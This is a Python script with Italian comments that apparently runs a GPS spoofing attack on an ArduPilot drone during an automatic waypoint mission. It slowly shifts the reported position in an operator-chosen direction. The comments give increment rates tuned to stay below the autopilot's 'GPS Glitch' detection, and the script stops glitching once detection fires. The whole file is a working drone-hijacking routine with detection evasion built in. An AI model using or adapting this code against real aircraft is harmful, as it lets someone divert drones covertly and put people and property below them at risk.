import time
import math
from controller.glitch_controller import GlitchController
from gps_reader.gps_reader import GPSReader
from monitor.flight_monitor import FlightMonitor
from utils.geo_utils import distance

print("Connessione ad ArduPilot...")

glitch = GlitchController()
gps = GPSReader()
monitor = FlightMonitor()

# VARIABLES

x_glitch = 0.0000  # Imposta il glitch costante

x_glitch_increment = 0.00001  # Incremento del glitch per ogni ciclo (in gradi decimali)

# OK FUNZIONA CON 0.00001 OGNI 1 SEC
# OK FUNZIONA CON 0.000015 OGNI 1 SEC --> PRIMA VOLTA ERRORI AP: EKF3 lane switch 1 / AP: EKF3 primary changed:1 -- DOPO PIÙ NIENTE
# NON FUNZIONA CON 0.00002 OGNI 1 SEC -- GLITCH RILEVATO SUBITO DA AP: GPS Glitch or Compass error

# IMPLEMENTARE MOVIMENTO A SCELTA SUD, NORD, EST, OVEST, SUD-EST, SUD-OVEST, NORD-EST, NORD-OVEST

y_glitch = 0.0000  # Imposta il glitch costante

y_glitch_increment = 0.00001  # Incremento del glitch per ogni ciclo (in gradi decimali)

speed_reached = False

land_wp = monitor.get_land_waypoint_seq()  # Ottieni l'indice del waypoint di atterraggio

glitch_detected = False

current_waypoint_seq = None
    
current_waypoint_position = None

current_gps_position = None

distance_to_next_wp = None

current_airspeed = 0

def reset_variables_for_next_waypoint():
    global speed_reached, glitch_detected, current_waypoint_seq, current_waypoint_position, current_gps_position, distance_to_next_wp, current_airspeed
    
    current_airspeed = 0
    
    speed_reached = False
    
    current_waypoint_seq = monitor.get_current_waypoint_seq()  # Ottieni l'indice del waypoint corrente
        
    current_waypoint_position = monitor.get_current_waypoint_position()  # Ottieni la posizione del waypoint corrente
    
    current_gps_position = gps.get_raw_gps()  # Ottieni la posizione GPS corrente
    
    distance_to_next_wp = distance(
        current_waypoint_position['lat'],
        current_waypoint_position['lon'],
        current_gps_position['lat'],
        current_gps_position['lon']
    )

def adjust_glitch_increment(airspeed):
    """
    Regola l'incremento del glitch in base alla velocità aerea corrente.
    a 10 m/s incrementa di 0.00005, le altre velocità rapportate
    """
    print(f"Velocità aerea corrente: {airspeed} m/s")
    
    if airspeed is None:
        return 0

    airspeed = math.floor(airspeed)

    if airspeed <= 2:
        return 0
    
    return 0.00005 * (airspeed / 10)  # Incremento proporzionale alla velocità aerea

def check_glitch_detection():
    """
    Controlla se il glitch è stato rilevato dal drone.
    """
    if monitor.get_statustext_events(["AP: GPS Glitch or Compass error"]):
        print(f"Glitch rilevato con x_glitch = {x_glitch}")
        return True
    return False

def spoof_to_direction(direction):
    """
    Imposta il glitch in base alla direzione scelta.
    """
    global x_glitch_increment, y_glitch_increment
    
    match direction:
        case "1":  # NORD
            print("Direzione NORD selezionata")
            x_glitch_increment = -0.00001
            y_glitch_increment = 0
        case "5":  # SUD
            print("Direzione SUD selezionata")
            x_glitch_increment = 0.00001
            y_glitch_increment = 0
        case "3":  # EST
            print("Direzione EST selezionata")
            x_glitch_increment = 0
            y_glitch_increment = -0.00001
        case "7":  # OVEST
            print("Direzione OVEST selezionata")
            x_glitch_increment = 0
            y_glitch_increment = 0.00001
        case "2":  # NORD-EST
            print("Direzione NORD-EST selezionata")
            x_glitch_increment = -0.00001
            y_glitch_increment = -0.00001
        case "8":  # NORD-OVEST
            print("Direzione NORD-OVEST selezionata")
            x_glitch_increment = -0.00001
            y_glitch_increment = 0.00001
        case "4":  # SUD-EST
            print("Direzione SUD-EST selezionata")
            x_glitch_increment = 0.00001
            y_glitch_increment = -0.00001
        case "6":  # SUD-OVEST
            print("Direzione SUD-OVEST selezionata")
            x_glitch_increment = 0.00001
            y_glitch_increment = 0.00001
        case _:
            print("Scelta non valida")
            raise SystemExit(1)

choice = input("\n" +
    "   NORD          NORD (1)     NORD\n" +
    "   OVEST (8)                  EST (2) \n" +
    "  -----------  ⇖   ⇑   ⇗   -----------\n" +
    "   OVEST (7)   ⇐       ⇒     EST (3) \n" +
    "  -----------  ⇙   ⇓   ⇘   -----------\n" +
    "   SUD (6)                    SUD (4) \n" +
    "   OVEST          SUD (5)     EST     \n\n" +
    "Scegli direzione del glitch: "
).strip()

spoof_to_direction(choice)  # Imposta l'incremento del glitch in base alla direzione scelta

# INIZIO MAIN

try:

    monitor.wait_for_mode("AUTO")

    time.sleep(5)  # Attendi 5 secondi prima di iniziare l'attacco

    ###################################
    #        PRIMO WAYPOINT           #
    ###################################

    print("Glitch primo waypoint")
    
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il primo waypoint

    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
        
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Valore corrente di x_glitch: {x_glitch}")
        print(f"Valore corrente di y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
        
    print("Velocità aerea troppo bassa o waypoint vicino, stop glitching")
        
    print("Attesa secondo waypoint")
        
    monitor.wait_for_next_waypoint(current_waypoint_seq)  # Attendi il passaggio al secondo waypoint

    ###################################
    #        SECONDO WAYPOINT         #
    ###################################
        
    print("Glitch secondo waypoint")
    
    # Reset variabili
    
    print("Reset variabili per il secondo waypoint")
        
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il secondo waypoint
        
    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
                
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Valore corrente di x_glitch: {x_glitch}")
        print(f"Valore corrente di y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
    
    print("Velocità aerea troppo bassa o waypoint vicino, stop glitching")
        
    print("Attesa terzo waypoint")
        
    monitor.wait_for_next_waypoint(current_waypoint_seq)  # Attendi il passaggio al terzo waypoint

    ###################################
    #        TERZO WAYPOINT           #
    ###################################

    print("Glitch terzo waypoint")
    
    # Reset variabili
    
    print("Reset variabili per il terzo waypoint")
    
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il terzo waypoint
        
    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
                
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Valore corrente di x_glitch: {x_glitch}")
        print(f"Valore corrente di y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
        
    print("Attesa landing")

    while monitor.get_current_waypoint_seq() != land_wp:  # Attendi il passaggio al waypoint di atterraggio
        time.sleep(5)
        
    print("Fine")

    time.sleep(5)  # Attendi 5 secondi prima di resettare il glitch
    
finally:
    glitch.reset()